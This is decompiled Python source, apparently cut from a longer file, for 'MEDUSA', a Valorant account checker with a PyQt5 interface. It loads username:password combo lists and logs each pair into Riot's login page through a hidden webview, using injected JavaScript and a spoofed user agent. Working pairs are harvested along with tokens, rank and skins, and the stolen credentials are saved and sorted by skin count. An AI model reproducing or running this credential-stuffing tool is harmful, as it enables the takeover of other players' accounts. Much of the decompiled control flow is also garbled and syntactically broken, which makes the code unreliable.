{\n                padding: 8px;\n                border-radius: 8px;\n                margin: 2px;\n            }\n            QListWidget::item:selected {\n                background-color: #007AFF;\n            }\n            QProgressBar {\n                border: 2px solid #48484A;\n                border-radius: 10px;\n                text-align: center;\n                color: #FFFFFF;\n                height: 25px;\n                font-weight: bold;\n            }\n            QProgressBar::chunk {\n                background: qlineargradient(x1:0, y1:0, x2:1, y2:0, \n                    stop:0 #30D158, stop:1 #34C759);\n                border-radius: 8px;\n            }\n            QLabel#title { \n                font-size: 36px; \n                font-weight: bold; \n                color: #FFFFFF;\n            }\n            #footerLabel {\n                color: #8E8E93;\n                font-size: 13px;\n                text-decoration: none;\n                background-color: transparent;\n            }\n            #footerLabel:hover {\n                color: #007AFF;\n            }\n            QLabel#keyLabel { \n                color: #30D158; \n                font-weight: bold;\n                font-size: 14px;\n            }\n        '
    def apply_modern_theme(self):
        QApplication.setPalette(get_modern_palette())
        self.setStyleSheet(self.get_modern_stylesheet())
    def init_main_view(self):
        main_layout = QVBoxLayout(self.main_widget)
        main_layout.setContentsMargins(30, 30, 30, 30)
        main_layout.setSpacing(25)
        header_container = QWidget()
        header_container.setStyleSheet('\n            QWidget {\n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,\n                    stop:0 rgba(255, 255, 255, 0.08),\n                    stop:1 rgba(255, 255, 255, 0.03));\n                border: 1px solid rgba(255, 255, 255, 0.12);\n                border-radius: 20px;\n                padding: 15px;\n            }\n        ')
        header_layout = QHBoxLayout(header_container)
        header_layout.setSpacing(20)
        header_layout.setContentsMargins(20, 15, 20, 15)
        logo_container = QWidget()
        logo_container.setFixedSize(80, 80)
        logo_layout = QVBoxLayout(logo_container)
        logo_layout.setContentsMargins(0, 0, 0, 0)
        self.logo_label = QLabel()
        self.logo_label.setFixedSize(70, 70)
        self.logo_label.setAlignment(Qt.AlignCenter)
        logo_layout.addWidget(self.logo_label, alignment=Qt.AlignCenter)
        self.load_logo()
        title_section = QWidget()
        title_layout = QVBoxLayout(title_section)
        title_layout.setSpacing(5)
        title_label = QLabel('MEDUSA')
        title_label.setObjectName('title')
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setWordWrap(False)
        title_label.setStyleSheet('\n            QLabel {\n                font-size: 42px;\n                font-weight: 900;\n                color: #FFFFFF;\n                letter-spacing: 3px;\n                text-shadow: 0 0 30px rgba(0, 122, 255, 0.6);\n                font-family: \'Segoe UI\', Arial, sans-serif;\n            }\n        ')
        subtitle_label = QLabel('VALORANT ACCOUNT CHECKER')
        subtitle_label.setAlignment(Qt.AlignCenter)
        subtitle_label.setWordWrap(False)
        subtitle_label.setStyleSheet('\n            QLabel {\n                font-size: 14px;\n                color: #B0B0B5;\n                font-weight: 600;\n                letter-spacing: 2px;\n                font-family: \'Segoe UI\', Arial, sans-serif;\n            }\n        ')
        title_layout.addWidget(title_label)
        title_layout.addWidget(subtitle_label)
        title_section.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        right_section = QWidget()
        right_layout = QVBoxLayout(right_section)
        right_layout.setSpacing(15)
        avatar_container = QWidget()
        avatar_container.setFixedSize(90, 90)
        avatar_container.setStyleSheet('\n            QWidget {\n                background: transparent;\n                border: none;\n            }\n        ')
        avatar_layout = QVBoxLayout(avatar_container)
        avatar_layout.setContentsMargins(0, 0, 0, 0)
        self.avatar_label = QLabel()
        self.avatar_label.setFixedSize(90, 90)
        self.settings_button = QPushButton('SETTINGS')
        self.settings_button.setFixedSize(100, 40)
        self.settings_button.setStyleSheet('\n            QPushButton {\n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,\n                    stop:0 #007AFF, stop:1 #5856D6);\n                color: #FFFFFF;\n                border: 2px solid #007AFF;\n                border-radius: 10px;\n                font-size: 12px;\n                font-weight: 700;\n                text-transform: uppercase;\n                letter-spacing: 0.3px;\n                font-family: \'Segoe UI\', Arial, sans-serif;\n            }\n            QPushButton:hover {\n                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,\n                    stop:0 #4A90E2, stop:1 #007AFF);\n                transform: translateY(-1px);\n            }\n            QPushButton:pressed {\n                transform: translateY(0px);\n            }\n        ')
        self.settings_button.clicked.connect(self.show_settings)
        avatar_layout.addWidget(self.avatar_label, alignment=Qt.AlignCenter)
        right_layout.addWidget(avatar_container, alignment=Qt.AlignCenter)
        right_layout.addWidget(self.settings_button, alignment=Qt.AlignCenter)
        self.update_avatar_display()
        header_layout.addWidget(logo_container)
        header_layout.addWidget(title_section)
        header_layout.addWidget(right_section)
        file_group = QGroupBox('Combo File')
        file_group.setStyleSheet('\n            QGroupBox {\n                font-size: 14px;\nfont-weight: 600;\ncolor: #FFFFFF;\nborder: 1px solid #007AFF;\nborder-radius: 12px;\nmargin-top: 15px;\npadding-top: 15px;\nbackground: rgba(0, 122, 255, 0.05);\n}\nQGroupBox::title {\nsubcontrol-origin: margin;\nleft: 15px;\npadding: 0 10px;\ncolor: #007AFF;\nfont-weight: 600;\n}\n')
        file_layout = QHBoxLayout()
        file_layout.setSpacing(15)
        file_layout.setContentsMargins(20, 20, 20, 20)
        self.file_path = QLineEdit(COMBO_FILE)
        self.file_path.setReadOnly(True)
        self.file_path.setStyleSheet('\n            QLineEdit {\n                background: #1C1C1E;\n                color: #FFFFFF;\n                border: 1px solid #48484A;\n                border-radius: 8px;\n                padding: 10px 15px;\n                font-size: 13px;\n            }\n            QLineEdit:focus {\n                border-color: #007AFF;\n            }\n        ')
        browse_button = QPushButton('📁 BROWSE')
        browse_button.setStyleSheet('\n            QPushButton {\n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #FF9500, stop:1 #E6850E);\n                color: #FFFFFF;\n                border: 2px solid #FF9500;\n                padding: 15px 25px;\n                border-radius: 12px;\n                font-size: 15px;\n                font-weight: 800;\n                text-transform: uppercase;\n                letter-spacing: 1px;\n                min-height: 20px;\n                text-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);\n            }\n            QPushButton:hover {\n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #FFB84D, stop:1 #FF9500);\n                transform: translateY(-2px);\n                box-shadow: 0 4px 12px rgba(255, 149, 0, 0.4);\n            }\n            QPushButton:pressed {\n                transform: translateY(1px);\n                box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);\n            }\n')
        browse_button.clicked.connect(self.browse_file)
        file_layout.addWidget(self.file_path)
        file_layout.addWidget(browse_button)
        file_group.setLayout(file_layout)
        controls_container = QWidget()
        controls_container.setStyleSheet('\n            QWidget {\n                background: rgba(255, 255, 255, 0.03);\n                border: 1px solid rgba(255, 255, 255, 0.08);\n                border-radius: 12px;\n                padding: 15px;\n            }\n        ')
        controls = QHBoxLayout(controls_container)
        controls.setSpacing(15)
        self.start_btn = QPushButton('🚀 START CHECKING')
        self.start_btn.setObjectName('startButton')
        self.start_btn.setStyleSheet('\n            QPushButton {\n                background: #30D158;\n                color: #FFFFFF;\n                border: none;\n                border-radius: 12px;\n                padding: 15px 30px;\n                font-size: 14px;\n                font-weight: 700;\n                text-transform: uppercase;\n                letter-spacing: 0.5px;\n                font-family: \'Segoe UI\', Arial, sans-serif;\n            }\n            QPushButton:hover {\n                background: #28CD4C;\n                transform: translateY(-2px);\n                box-shadow: 0 4px 12px rgba(40, 201, 70, 0.4);\n            }\n        ')
        self.start_btn.clicked.connect(self.start_checking)
        self.stop_btn = QPushButton('⏹️ STOP')
        self.stop_btn.setStyleSheet('\n            QPushButton {\n                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #FF453A, stop:1 #D70015);\n                color: #FFFFFF;\n                border: 2px solid #FF453A;\n                padding: 15px 25px;\n                transform: translateY(-2px);\n                box-shadow: 0 4px 12px rgba(255, 69, 58, 0.4);\n            }\n            QPushButton:disabled {\n                background: #2C2C2E;\n                color: #8E8E93;\n                border: 2px solid #2C2C2E;\n            }\n        ')
        self.stop_btn.clicked.connect(self.stop_checking)
        self.stop_btn.setEnabled(False)
        controls.addWidget(self.start_btn)
        controls.addWidget(self.stop_btn)
        progress_container = QWidget()
        progress_layout = QVBoxLayout(progress_container)
        progress_layout.setSpacing(8)
        progress_label = QLabel('Progress')
        progress_label.setStyleSheet('\n            QLabel {\n                color: #FFFFFF;\n                font-size: 13px;\n                font-weight: 600;\n            }\n        ')
        self.progress = QProgressBar()
        self.progress.setRange(0, 100)
        self.progress.setFixedHeight(20)
        self.progress.setStyleSheet('\n            QProgressBar {\n                border: 1px solid #48484A;\n                border-radius: 10px;\n                text-align: center;\n                color: #FFFFFF;\n                font-size: 11px;\n                background: #1C1C1E;\n            }\n            QProgressBar::chunk {\n                background: #007AFF;\n                border-radius: 9px;\n            }\n        ')
        progress_layout.addWidget(progress_label)
        progress_layout.addWidget(self.progress)
        stats_container = QWidget()
        stats_container.setStyleSheet('\n            QWidget {\n                background: rgba(255, 255, 255, 0.03);\n                border: 1px solid rgba(255, 255, 255, 0.08);\n                border-radius: 12px;\n                padding: 15px;\n            }\n        ')
        stats = QHBoxLayout(stats_container)
        stats.setSpacing(20)
        success_widget = QWidget()
        success_layout = QVBoxLayout(success_widget)
        success_layout.setSpacing(5)
        success_title = QLabel('Successful')
        success_title.setStyleSheet('\n            QLabel {\n                color: #30D158;\n                font-size: 12px;\n                font-weight: 600;\n            }\n        ')
        success_title.setAlignment(Qt.AlignCenter)
        self.success_label = QLabel('0')
        self.success_label.setStyleSheet('\n            QLabel {\n                color: #FFFFFF;\n                font-size: 18px;\n                font-weight: 700;\n            }\n        ')
        self.success_label.setAlignment(Qt.AlignCenter)
        success_layout.addWidget(success_title)
        success_layout.addWidget(self.success_label)
        failed_widget = QWidget()
        failed_layout = QVBoxLayout(failed_widget)
        failed_layout.setSpacing(5)
        failed_title = QLabel('Failed')
        failed_title.setStyleSheet('\n            QLabel {\n                color: #FF453A;\n                font-size: 12px;\n                font-weight: 600;\n            }\n        ')
        failed_title.setAlignment(Qt.AlignCenter)
        self.failed_label = QLabel('0')
        self.failed_label.setStyleSheet('\n            QLabel {\n                color: #FFFFFF;\n                font-size: 18px;\n                font-weight: 700;\n            }\n        ')
        self.failed_label.setAlignment(Qt.AlignCenter)
        failed_layout.addWidget(failed_title)
        failed_layout.addWidget(self.failed_label)
        stats.addWidget(success_widget)
        stats.addStretch(1)
        stats.addWidget(failed_widget)
        accounts_group = QGroupBox('Valid Accounts')
        accounts_group.setStyleSheet('\n            QGroupBox {\n                font-size: 14px;\n                font-weight: 600;\n                color: #FFFFFF;\n                border: 1px solid #007AFF;\n                border-radius: 12px;\n                margin-top: 15px;\n                padding-top: 15px;\n                background: rgba(0, 122, 255, 0.05);\n            }\n            QGroupBox::title {\n                subcontrol-origin: margin;\n                left: 15px;\n                padding: 0 10px;\n                color: #007AFF;\n                font-weight: 600;\n            }\n        ')
        accounts_layout = QVBoxLayout()
        accounts_layout.setContentsMargins(15, 15, 15, 15)
        self.accounts_list = QListWidget()
        self.accounts_list.setStyleSheet('\n            QListWidget {\n                background: #1C1C1E;\n                color: #FFFFFF;\n                border: 1px solid #48484A;\n                border-radius: 8px;\n                padding: 8px;\n                font-size: 12px;\n            }\n            QListWidget::item {\n                padding: 8px;\n                border-radius: 6px;\n                margin: 2px;\n                background: rgba(255, 255, 255, 0.03);\n            }\n            QListWidget::item:selected {\n                background: #007AFF;\n                color: #FFFFFF;\n            }\n            QListWidget::item:hover {\n                background: rgba(0, 122, 255, 0.15);\n            }\n        ')
        accounts_layout.addWidget(self.accounts_list)
        accounts_group.setLayout(accounts_layout)
        footer_layout = QVBoxLayout()
        footer_layout.setAlignment(Qt.AlignCenter)
        self.key_label = QLabel()
        self.key_label.setObjectName('keyLabel')
        self.key_label.setAlignment(Qt.AlignCenter)
        self.discord_label = QLabel('Discord\'a Katıl: discord.gg/valoranthesap')
        self.discord_label.setObjectName('footerLabel')
        self.discord_label.setCursor(QCursor(Qt.PointingHandCursor))
        self.discord_label.mousePressEvent = self.open_discord_link
        discord_path = os.path.join(AVATAR_FOLDER, 'discord_icon.svg')
        if not os.path.exists(discord_path):
            download_image(DISCORD_ICON_URL, discord_path)
        self.discord_label.setText(f'<img src=\"{discord_path}\" width=\"20\" height=\"20\" style=\"vertical-align: middle;\"> Discord\'a Katıl: discord.gg/valoranthesap')
        self.discord_label.setOpenExternalLinks(True)
        footer_layout.addWidget(self.key_label)
        footer_layout.addWidget(self.discord_label)
        main_layout.addWidget(header_container)
        main_layout.addWidget(file_group)
        main_layout.addWidget(controls_container)
        main_layout.addWidget(progress_container)
        main_layout.addWidget(stats_container)
        main_layout.addWidget(accounts_group)
        main_layout.addLayout(footer_layout)
    def show_settings(self):
        try:
            from modern_settings_dialog import ModernSettingsDialog
            dialog = ModernSettingsDialog(self)
            dialog.exec_()
        except Exception as e:
            print(f'Settings dialog error: {e}')
            from PyQt5.QtWidgets import QMessageBox
            QMessageBox.information(self, 'Settings', 'Settings dialog is temporarily unavailable.')
    def show_main_view(self):
        self.stacked_widget.setCurrentWidget(self.main_widget)
    def update_proxy_settings(self, proxy_config):
        print(f'Proxy ayarları güncellendi: {proxy_config}')
    def load_images(self):
        download_image(LOGO_URL, os.path.join(AVATAR_FOLDER, 'medusa.png'))
        download_image(APP_ICON_URL, os.path.join(AVATAR_FOLDER, 'vaclogo.ico'))
        download_image(DEFAULT_AVATAR_URL, os.path.join(AVATAR_FOLDER, 'default_avatar.jpg'))
        icon_path = os.path.join(AVATAR_FOLDER, 'vaclogo.ico')
        if os.path.exists(icon_path):
            self.setWindowIcon(QIcon(icon_path))
    def load_logo(self):
        logo_path = LOGO_LOCAL_PATH
        print(f'Logo yolu: {logo_path}')
        print('Loading logo assets...')
        if not os.path.exists(logo_path):
            print('Downloading logo assets...')
            download_image(LOGO_URL, logo_path)
        if os.path.exists(logo_path):
            pixmap = QPixmap(logo_path)
            print(f'Logo loaded successfully: {not pixmap.isNull()}')
            if not pixmap.isNull():
                scaled_pixmap = pixmap.scaled(70, 70, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                self.logo_label.setPixmap(scaled_pixmap)
                self.logo_label.setStyleSheet('\n                    QLabel {\n                        background: transparent;\n                        border: none;\n                        padding: 0px;\n                        min-width: 70px;\n                        min-height: 70px;\n                        max-width: 70px;\n                        max-height: 70px;\n                    }\n                ')
                print('Logo assets loaded successfully')
            else:
                print('Using fallback logo')
                self.logo_label.setText('⚡')
                self.logo_label.setStyleSheet('\n                    QLabel {\n                        color: #FFFFFF;\n                        font-size: 32px;\n                        background: transparent;\n                        border: none;\n                        text-align: center;\n                        padding: 0px;\n                        min-width: 70px;\n                        min-height: 70px;\n                        max-width: 70px;\n                        max-height: 70px;\n                    }\n                ')
        else:
            print('Using default logo fallback')
            self.logo_label.setText('⚡')
            self.logo_label.setStyleSheet('\n                QLabel {\n                    color: #FFFFFF;\n                    font-size: 32px;\n                    background: transparent;\n                    border: none;\n                    text-align: center;\n                    padding: 0px;\n                    min-width: 70px;\n                    min-height: 70px;\n                    max-width: 70px;\n                    max-height: 70px;\n                }\n            ')
    def update_avatar_display(self):
        config = get_config()
        avatar_path = config.get('avatar_path')
        if not avatar_path or not os.path.exists(avatar_path):
            avatar_path = os.path.join(AVATAR_FOLDER, 'default_avatar.jpg')
            download_image(DEFAULT_AVATAR_URL, avatar_path)
            config['avatar_path'] = avatar_path
            save_config(config)
        if os.path.exists(avatar_path):
            pixmap = QPixmap(avatar_path)
            if not pixmap.isNull():
                scaled_pixmap = pixmap.scaled(80, 80, Qt.KeepAspectRatio, Qt.SmoothTransformation)
                rounded_pixmap = get_rounded_pixmap(scaled_pixmap, 80)
                self.avatar_label.setPixmap(rounded_pixmap)
                self.avatar_label.setStyleSheet('\n                    QLabel {\n                        border: none;\n                        border-radius: 45px;\n                        background: transparent;\n                        padding: 0px;\n                        min-width: 90px;\n                        min-height: 90px;\n                        max-width: 90px;\n                        max-height: 90px;\n                    }\n                ')
            else:
                self.avatar_label.setText('👤')
                self.avatar_label.setStyleSheet('\n                    QLabel {\n                        color: #FFFFFF;\n                        font-size: 40px;\n                        border: none;\n                        border-radius: 45px;\n                        background: transparent;\n                        text-align: center;\n                        padding: 20px;\n                        min-width: 90px;\n                        min-height: 90px;\n                        max-width: 90px;\n                        max-height: 90px;\n                    }\n                ')
        else:
            self.avatar_label.setText('👤')
            self.avatar_label.setStyleSheet('\n                QLabel {\n                    color: #FFFFFF;\n                    font-size: 40px;\n                    border: none;\n                    border-radius: 45px;\n                    background: transparent;\n                    text-align: center;\n                    padding: 20px;\n                    min-width: 90px;\n                    min-height: 90px;\n                    max-width: 90px;\n                    max-height: 90px;\n                }\n            ')
    def open_discord_link(self, event):
        import webbrowser
        webbrowser.open('https://discord.gg/valoranthesap')
    def safe_close(self, window):
        if window in self.windows:
            try:
                window.destroy()
                self.windows.remove(window)
            except Exception:
                return None
    def browse_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, 'Combo Dosyası Seç', '', 'Metin Dosyaları (*.txt)')
        if file_name:
            self.file_path.setText(file_name)
    def read_combos(self):
        # irreducible cflow, using cdg fallback
        file_path = self.file_path.text()
        with open(file_path, 'r', encoding='utf-8') as file, [line.strip().split(':', 1) for line in file if ':' in line]:
            except FileNotFoundError:
                QMessageBox.critical(self, 'Hata', f'Dosya bulunamadı: {file_path}')
                return []
                except Exception as e:
                        QMessageBox.critical(self, 'Hata', f'Dosya okuma hatası: {str(e)}')
                        return []
    def start_checking(self):
        # irreducible cflow, using cdg fallback
        combos = self.read_combos()
        if not combos:
            QMessageBox.warning(self, 'Uyarı', 'Geçerli kullanıcı adı:şifre çifti bulunamadı!')
                return
            print(f'📋 {len(combos)} combo loaded for checking...')
            self.accounts_list.clear()
            self.success_count = 0
            self.failed_count = 0
            self.update_stats()
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.worker_thread = WorkerThread(combos)
            self.worker_thread.update_signal.connect(self.update_log)
            self.worker_thread.progress_signal.connect(self.update_progress)
            self.worker_thread.finished_signal.connect(self.on_finished)
            self.worker_thread.login_request_signal.connect(self.perform_login)
            self.result_signal.connect(self.add_valid_account)
            print('🚀 Starting checking process...')
            self.worker_thread.start()
                except Exception as e:
                        print(f'❌ Start checking error: {e}')
                        QMessageBox.critical(self, 'Hata', f'Checking başlatılamadı: {str(e)}')
                        self.start_btn.setEnabled(True)
                        self.stop_btn.setEnabled(False)
    def stop_checking(self):
        try:
            if hasattr(self, 'worker_thread') and self.worker_thread:
                    self.worker_thread.running = False
                    self.worker_thread.quit()
                    self.worker_thread.wait()
            if hasattr(self, 'windows'):
                for window in self.windows[:]:
                    try:
                        self.safe_close(window)
                    except:
                        pass
                    else:
                        pass
                self.windows.clear()
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            print('⏹️ Checking stopped')
        except Exception as e:
            print(f'❌ Stop checking error: {e}')
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
    def update_log(self, message):
        print(message)
    def update_progress(self, value):
        self.progress.setValue(value)
    def add_valid_account(self, account_info):
        try:
            game_name = account_info.get('game_name', 'N/A')
            tag_line = account_info.get('tag_line', 'N/A')
            skin_count = account_info.get('skin_count', 0)
            rank = account_info.get('current_rank', 'N/A')
            username = account_info.get('username', 'N/A')
            password = account_info.get('password', 'N/A')
            display_text = f'{game_name}#{tag_line} | Skins: {skin_count} | Rank: {rank} | {username}:{password}'
            self.accounts_list.addItem(display_text)
            self.save_account_info(account_info)
            self.success_count += 1
            self.update_stats()
            print(f'✅ Valid account added: {username}:{password}')
        except Exception as e:
            print(f'❌ Error adding account: {e}')
    def save_account_info(self, account_info):
        if not account_info:
            print('❌ Account info save failed: account_info is empty.')
            return
        else:
            working_accounts_dir = 'working_accounts'
            os.makedirs(working_accounts_dir, exist_ok=True)
            skin_folders = {'0-4': (0, 4), '5-10': (5, 10), '10-20': (10, 20), '20-30': (20, 30), '30andmore': (30, float('inf'))}
            for folder_name in skin_folders:
                os.makedirs(os.path.join(working_accounts_dir, folder_name), exist_ok=True)
            skin_count = account_info.get('skin_count', 0)
            game_name = account_info.get('game_name', 'unknown')
            tag_line = account_info.get('tag_line', '0000')
            username = account_info.get('username', 'unknown')
            password = account_info.get('password', 'unknown')
            folder_name = None
            for name, (min_skins, max_skins) in skin_folders.items():
                pass
            if min_skins <= skin_count <= max_skins:
                    folder_name = name
                    break
        if not folder_name:
            folder_name = '0-4'
            os.makedirs(os.path.join(working_accounts_dir, folder_name), exist_ok=True)
        folder_path = os.path.join(working_accounts_dir, folder_name)
        base_filename = f'{skin_count}skin_{game_name}#{tag_line}.txt'
        file_path = os.path.join(folder_path, base_filename)
        counter = 1
        if os.path.exists(file_path):
            file_path = os.path.join(folder_path, f'{skin_count}skin_{counter}_{game_name}#{tag_line}.txt')
            counter += 1
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(account_info, f, indent=4, ensure_ascii=False)
            print(f'✅ Account saved: {file_path}')
        except Exception as e:
            print(f'❌ Account save error: {game_name}#{tag_line} → {str(e)}')
    def update_stats(self):
        self.success_label.setText(str(self.success_count))
        self.failed_label.setText(str(self.failed_count))
    def on_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
    def perform_login(self, username, password):
        handled = {'done': False}
        window = webview.create_window('Riot Login', 'https://auth.riotgames.com/authorize?redirect_uri=https%3A%2F%2Fplayvalorant.com%2Fopt_in&client_id=play-valorant-web-prod&response_type=token%20id_token&nonce=1&scope=account%20openid', width=800, height=600, hidden=True, text_select=True)
        self.windows.append(window)
        def on_loaded():
            # irreducible cflow, using cdg fallback
            max_attempts = 3
            attempt = 0
            start_time = time.time()
            timeout = 15
            try:
                window.evaluate_js('\n                    Object.defineProperty(navigator, \'userAgent\', {\n                        get: function() { return \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\'; }\n                    });\n                ')
            except Exception as e:
                print(f'❌ Failed to set user agent for {username}:{password}: {str(e)}')
            if attempt < max_attempts and time.time() - start_time < timeout:
                attempt += 1
                time.sleep(1)
                current_url = window.get_current_url()
                parsed_url = urllib.parse.urlparse(current_url)
                fragment = urllib.parse.parse_qs(parsed_url.fragment)
                if 'access_token' in fragment:
                    access_token = fragment['access_token'][0]
                    if not handled['done']:
                        print(f'✅ Success! {username}:{password} → Token: {access_token[:15]}...')
                        handled['done'] = True
                        account_info = self.get_account_info_and_entitlements(access_token, username, password)
                        if account_info:
                            self.result_signal.emit(account_info)
                    self.safe_close(window)
                        return
                        break
                                html = window.evaluate_js('document.documentElement.outerHTML') or ''
                                error_messages = ['Kullanıcı adın veya şifren yanlış olabilir', 'Your username or password may be incorrect', '用户名或密码可能不正确', 'El nombre de usuario o la contraseña pueden ser incorrectos', 'Le nom d\'utilisateur ou le mot de passe peut être incorrect', 'Der Benutzername oder das Passwort ist möglicherweise falsch', 'Неверное имя пользователя или пароль', 'ユーザー名またはパスワードが間違っている可能性があります']
                                if any((msg in html for msg in error_messages)):
                                    if not handled['done']:
                                        print(f'❌ Wrong password or username: {username}:{password}')
                                        self.failed_count += 1
                                        self.update_stats()
                                        handled['done'] = True
                                    self.safe_close(window)
                                        return
                                        break
                                                form_ready_js = '\n                (function() {\n                    let usernameInput = document.querySelector(\'input[name=\"username\"]\');\n                    let passwordInput = document.querySelector(\'input[name=\"password\"]\');\n                    let submitButton = document.querySelector(\'button[data-testid=\"btn-signin-submit\"]\');\n                    return usernameInput && passwordInput && submitButton;\n                })();\n                '
                                                try:
                                                    form_ready = window.evaluate_js(form_ready_js)
                                                except Exception as e:
                                                    form_ready = False
                                                    print(f'❌ Form ready check error for {username}:{password}: {str(e)}')
                                                if form_ready:
                                                    js_code = f'\n                    (function() {\n                        function setNativeValue(element, value) {\n                            let lastValue = element.value;\n                            element.value = value;\n                            let event = new Event(\'input\', { bubbles: true });\n                            event.simulated = true;\n                            let tracker = element._valueTracker;\n                            if (tracker) {\n                                tracker.setValue(lastValue);\n                            }\n                            element.dispatchEvent(event);\n                        }\n                        let usernameInput = document.querySelector(\'input[name=\"username\"]\');\n                        let passwordInput = document.querySelector(\'input[name=\"password\"]\');\n                        let submitButton = document.querySelector(\'button[data-testid=\"btn-signin-submit\"]\');\n                        if (usernameInput && passwordInput && submitButton) {\n                            setNativeValue(usernameInput, \'{username}\');\n                            setNativeValue(passwordInput, \'{password}\');\n                            setTimeout(() => submitButton.click(), 500);\n                            return {success: true};\n                        }\n                        return {success: false};\n                    })();\n                    '
                                                    result = window.evaluate_js(js_code)
                                                    if not result.get('success', False):
                                                        print(f'❌ Failed to submit form for {username}:{password}')
                                                        self.safe_close(window)
                                                            return
                                                            break
                                                        time.sleep(2)
                                                        current_url = window.get_current_url()
                                                        parsed_url = urllib.parse.urlparse(current_url)
                                                        fragment = urllib.parse.parse_qs(parsed_url.fragment)
                                                        if 'access_token' in fragment:
                                                            access_token = fragment['access_token'][0]
                                                            if not handled['done']:
                                                                print(f'✅ Success! {username}:{password} → Token: {access_token[:15]}...')
                                                                handled['done'] = True
                                                                account_info = self.get_account_info_and_entitlements(access_token, username, password)
                                                                if account_info:
                                                                    self.result_signal.emit(account_info)
                                                            self.safe_close(window)
                                                                return
                                                                break
                                                                        html = window.evaluate_js('document.documentElement.outerHTML') or ''
                                                                        error_messages = ['Kullanıcı adın veya şifren yanlış olabilir', 'Your username or password may be incorrect', '用户名或密码可能不正确', 'El nombre de usuario o la contraseña pueden ser incorrectos', 'Le nom d\'utilisateur ou le mot de passe peut être incorrect', 'Der Benutzername oder das Passwort ist möglicherweise falsch', 'Неверное имя пользователя или пароль', 'ユーザー名またはパスワードが間違っている可能性があります']
                                                                        if any((msg in html for msg in error_messages)):
                                                                            if not handled['done']:
                                                                                print(f'❌ Wrong password or username: {username}:{password}')
                                                                                self.update_stats()
                                                                                handled['done'] = True
                                                                            self.safe_close(window)
                                                                                return
                                                                                break
                                                                                            if not handled['done']:
                                                                                                print(f'❌ Timeout or failure for {username}:{password}')
                                                                                                self.update_stats()
                                                                                                handled['done'] = True
                                                                                            self.safe_close(window)
                    except Exception as e:
                            print(f'❌ URL check error for {username}:{password}: {str(e)}')
                                    except Exception as e:
                                            print(f'❌ HTML check error for {username}:{password}: {str(e)}')
                                                            except Exception as e:
                                                                    print(f'❌ JavaScript error for {username}:{password}: {str(e)}')
                                                                    self.safe_close(window)
                                                                        return
                                                            except Exception as e:
                                                                    print(f'❌ Final URL check error for {username}:{password}: {str(e)}')
                                                                            except Exception as e:
                                                                                    print(f'❌ Final HTML check error for {username}:{password}: {str(e)}')
        window.events.loaded += on_loaded
        try:
            webview.start()
        except Exception as e:
            print(f'❌ Window error for {username}:{password}: {str(e)}')
            self.safe_close(window)
    def riot_auth_login(self, username, password):
        # irreducible cflow, using cdg fallback
        session = requests.Session()
        auth_url = 'https://auth.riotgames.com/api/v1/authorization'
        auth_data = {'client_id': 'play-valorant-web-prod', 'nonce': '1', 'redirect_uri': 'https://playvalorant.com/opt_in', 'response_type': 'token id_token', 'scope': 'account openid'}
        auth_response = session.post(auth_url, json=auth_data, timeout=10)
        if auth_response.status_code!= 200:
            return
            login_url = 'https://auth.riotgames.com/api/v1/authorization'
            login_data = {'type': 'auth', 'username': username, 'password': password, 'remember': False, 'language': 'en_US'}
            login_response = session.put(login_url, json=login_data, timeout=10)
            if login_response.status_code!= 200:
                return
                response_data = login_response.json()
                if response_data.get('type') == 'response':
                    response_url = response_data.get('response', {}).get('parameters', {}).get('uri', '')
                    if 'access_token=' in response_url:
                        pass
                    access_token = response_url.split('access_token=')[1].split('&')[0]
                    return access_token
                    return None
                except Exception as e:
                        print(f'❌ Riot auth error: {e}')
                            return None
    def get_account_info_and_entitlements(self, access_token, username, password):
        # irreducible cflow, using cdg fallback
        headers_auth = {'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'}
        ent_response = requests.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers_auth, json={}, timeout=10)
        if ent_response.status_code!= 200:
            print(f'❌ Failed to get entitlements token: {ent_response.status_code}')
                return
            entitlements_token = ent_response.json().get('entitlements_token')
            if not entitlements_token:
                print('❌ Empty entitlements token.')
                    return
                user_info_response = requests.get('https://auth.riotgames.com/userinfo', headers=headers_auth, timeout=10)
                if user_info_response.status_code!= 200:
                    print(f'❌ Failed to get user info: {user_info_response.status_code}')
                        return
                    user_info = user_info_response.json()
                    puuid = user_info.get('sub')
                    if not puuid:
                        print('❌ Failed to get PUUID.')
                            return
                        region_response = requests.get('https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant', headers=headers_auth, timeout=10)
                        region = region_response.json().get('affinities', {}).get('live', 'eu') if region_response.status_code == 200 else None
                        regions = [region] if region else ['eu', 'na', 'ap', 'kr', 'latam']
                        platform_info = base64.b64encode(json.dumps({'platformType': 'PC', 'platformOS': 'Windows', 'platformOSVersion': '10.0.19042.1.256.64bit', 'platformChipset': 'Unknown'}).encode()).decode()
                        client_version = self.get_client_version()
                        for region in regions:
                                print(f'🔍 Trying region: {region}')
                                headers_game = {'Authorization': f'Bearer {access_token}', 'X-Riot-Entitlements-JWT': entitlements_token, 'Content-Type': 'application/json', 'X-Riot-ClientPlatform': platform_info, 'X-Riot-ClientVersion': client_version}
                                    skin_response = requests.get(f'https://pd.{region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433', headers=headers_game, timeout=10)
                                    skin_names = []
                                    if skin_response.status_code == 200:
                                        response_API = requests.get('https://raw.githubusercontent.com/xharky/Valorant-list/main/Skinlist.txt', timeout=10)
                                        if response_API.status_code!= 200:
